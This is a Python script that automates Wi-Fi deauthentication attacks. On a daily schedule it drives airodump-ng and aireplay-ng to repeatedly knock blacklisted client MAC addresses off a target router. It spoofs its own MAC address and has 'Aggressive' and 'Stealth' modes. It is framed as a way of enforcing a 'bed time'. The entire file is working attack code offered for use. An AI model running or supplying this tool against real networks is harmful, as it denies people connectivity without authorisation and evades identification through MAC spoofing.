#!/usr/bin/env python
#
# Deauthenticates Clients From A Network (Setting Up a Bed Time. The Hard Way)
#
import os
import csv
import sys
import time
import argparse
import datetime
from subprocess import *
from threading import Thread

class Engine(object):
 def __init__(self,mac,channel,wlan,mode,s_hr,s_min,e_hr,e_min,desti='list-01.csv'):
  self.state = None # Off/On
  self.bssid = mac     
  self.wlan  = wlan
  self.mode  = mode
  self.s_hr  = int(s_hr)
  self.e_hr  = int(e_hr)
  self.s_min = int(s_min)
  self.e_min = int(e_min)
  self.chan  = channel
  self.csv   = desti
  self.alive = False
  self.delay = False
  self.dely  = 60 if mode == 'S' else 30
  self.n_s_h = '0{}'.format(self.s_hr) if len(str(self.s_hr))<2 else self.s_hr
  self.n_e_h = '0{}'.format(self.e_hr) if len(str(self.s_hr))<2 else self.e_hr
  self.n_s_m = '0{}'.format(self.s_min) if len(str(self.s_min))<2 else self.s_min
  self.n_e_m = '0{}'.format(self.e_min) if len(str(self.s_min))<2 else self.e_min

 def monitor(self):
  call(['ifconfig',self.wlan,'down'])
  call(['iwconfig',self.wlan,'mode','monitor'])
  Popen(['macchanger','-r',self.wlan],stdout=Devnull,stderr=Devnull)
  call(['ifconfig',self.wlan,'up'])
  call(['service','network-manager','stop'])

 def managed(self):
  call(['ifconfig',self.wlan,'down'])
  call(['iwconfig',self.wlan,'mode','managed'])
  Popen(['macchanger','-p',self.wlan],stdout=Devnull,stderr=Devnull)
  call(['ifconfig',self.wlan,'up'])
  call(['service','network-manager','restart'])
  exit()

 def scan(self):
  Popen(['pkill','airodump-ng']).wait()
  cmd=['airodump-ng','--output-format','csv','--bssid',self.bssid,'-c',self.chan,'-w','list',self.wlan]
  Popen(cmd,stderr=Devnull,stdout=Devnull)

 def obtainInfo(self):
  Popen(['pkill','airodump-ng']).wait()
  self.clean()
  cmd=['airodump-ng','--output-format','csv','-w','list',self.wlan]
  Popen(cmd,stderr=Devnull,stdout=Devnull)
  
 def attack(self,client):
  cmd=['aireplay-ng','-0','1','-a',self.bssid,'-c',client,'--ignore-negative-one',self.wlan]
  Popen(cmd,stdout=Devnull,stderr=Devnull).wait()

 def now(self):
  time=str(datetime.datetime.now()).split()[1][:5]
  return int(time[:2]),int(time[3:])

 def status(self,current):
  hrs,mins=current[0],current[1]
  if hrs==self.s_hr and mins==self.s_min:return True
  if hrs==self.e_hr and mins==self.e_min:return False

 def channels(self):
  try:
   with open(self.csv,'r') as AccessPoints:
    Data = csv.reader(AccessPoints,delimiter=',')
    for line in Data:
     if len(line) >= 10:
      chan  = str(line[3]).strip()
      bssid = str(line[0]).strip()
      if bssid==self.bssid:
       return chan
  except:self.obtainInfo()

 def clean(self):
  list=(item for item in os.listdir('.') if item.endswith('.csv')) 
  for item in list:os.remove(item)  

def from_file_to_list(file):
 list=[]
 if not os.path.exists(file):
  call(['clear'])
  exit('[!] Unable to locate: {}'.format(file))

 with open(file,'r') as _file:
  for item in _file:
   if ':' in item:
    new_item=item.strip()
    new_item.replace('\n','')
    list.append(new_item)

 if not len(list):
  call(['clear'])
  exit('[!] Unable to find mac addresses in: {}'.format(file))
 return list

def main():
 # Assign Arugments
 UserArgs = argparse.ArgumentParser() 
 UserArgs.add_argument('interface', help='wireless interface')
 UserArgs.add_argument('mac',       help='bssid of router')
 UserArgs.add_argument('mode',      help='[A]ggressive [S]tealth') # Aggressive: 15 sec; Stealth: 60 sec
 UserArgs.add_argument('channel',   help='channel of router')
 UserArgs.add_argument('blacklist', help='path to blacklist with mac addresses')
 UserArgs.add_argument('start',     help='time to start attack each day; Military Time; Enter 15:07')
 UserArgs.add_argument('end',       help='time to stop  attack each day; Military Time; Enter 17:15')
 Args = UserArgs.parse_args()
 
 # Assign Variables
 list  = Args.blacklist if Args.blacklist else Args.blacklist
 mode  = Args.mode[0].upper() if Args.mode else Args.mode
 mode  = 'S' if mode != 'A' and mode != 'S' else mode
 blist = from_file_to_list(list)
 wlan  = Args.interface
 chan  = Args.channel
 macs  = Args.mac
 mode  = mode[0]
 mem   = [[],[]]
 #
 blist=[mac for mac in blist]
 s_hr,s_min,e_hr,e_min=Args.start[:2],Args.start[3:],Args.end[:2],Args.end[3:]
 engine = Engine(macs,chan,wlan,mode,s_hr,s_min,e_hr,e_min)  

 # Enable Monitor Mode
 engine.monitor()
 
 # Change Directory
 os.chdir('/tmp')

 # Updates 
 def updates():
  if engine.alive:
   engine.obtainInfo()
   time.sleep(5)
   Popen(['pkill','airodump-ng']).wait()
   chan=str(engine.channels())
   if chan: engine.chan=chan 
   else:print '[!] Unable to locate: {}'.format(engine.bssid)

 # Keeps An Eye On The Time While Main Process Is Busy
 def check():
  while engine.delay:
   n=engine.now()
   hrs,mins=n[0],n[1]
   if not int(hrs) in mem[0] and not int(mins) in mem[1]:
    mem[0].append(int(hrs));mem[1].append(int(mins))  
   for a,alpha in enumerate(mem[0]):
    for b,beta in enumerate(mem[1]):
     if a!=b:continue
     if alpha == engine.e_hr and beta == engine.e_min:
      engine.state=False
      engine.alive=False
      engine.delay=False

 # Start Proc
 while 1:
  try:
   engine.state=engine.status(engine.now())
   if engine.state==None:msg=True if engine.alive else False
   if engine.state:
    call(['clear'])
    print 'Status\n[-] Attacking: {}\n[-] Attack Ends: {}:{}'.format(engine.state,engine.n_e_h,engine.n_e_m)
    
   elif engine.state==False:
    call(['clear'])
    engine.state=False
    engine.delay=False
    engine.alive=False
    Popen(['pkill','airodump-ng']).wait()
    print 'Status\n[-] Attacking: {}\n[-] Attack Starts: {}:{}'.format(engine.state,engine.n_s_h,engine.n_s_m)
    
   else:
    if engine.alive:
     call(['clear'])
     print 'Status\n[-] Attacking: {}\n[-] Attack Ends: {}:{}'.format(msg,engine.n_e_h,engine.n_e_m)
     
    else:
     call(['clear'])
     print 'Status\n[-] Attacking: {}\n[-] Attack Starts: {}:{}'.format(msg,engine.n_s_h,engine.n_s_m)
     
   if engine.state:
    if not engine.alive:
     engine.alive=True 
     del mem[0][:];del mem[1][:] 

   if engine.state==False:
    if engine.alive:Popen(['pkill','airodump-ng']).wait();engine.alive=False

   if engine.alive:
    engine.delay=True
    Thread(target=check).start()
    updates()
    engine.scan()
    for i,client in enumerate(blist):
     if i!=len(blist)-1:
      for n in range(3):engine.attack(client);time.sleep(25)
    time.sleep(engine.dely) 
    engine.delay=False
   time.sleep(.5)     
   del mem[0][:];del mem[1][:]         
  except KeyboardInterrupt:
   call(['clear'])
   engine.delay=False
   Popen(['pkill','airodump-ng']).wait()
   Popen(['pkill','aireplay-ng']).wait()
   for i in range(2):engine.managed();engine.clean()

if __name__ == '__main__':
 # Filters
 if sys.platform != 'linux2':
  exit('[-] Kali Linux 2.0 Required!')

 if os.getuid():
  exit('[-] Root Access Required!')

 Devnull = open(os.devnull,'w')
 # Start 
 main()
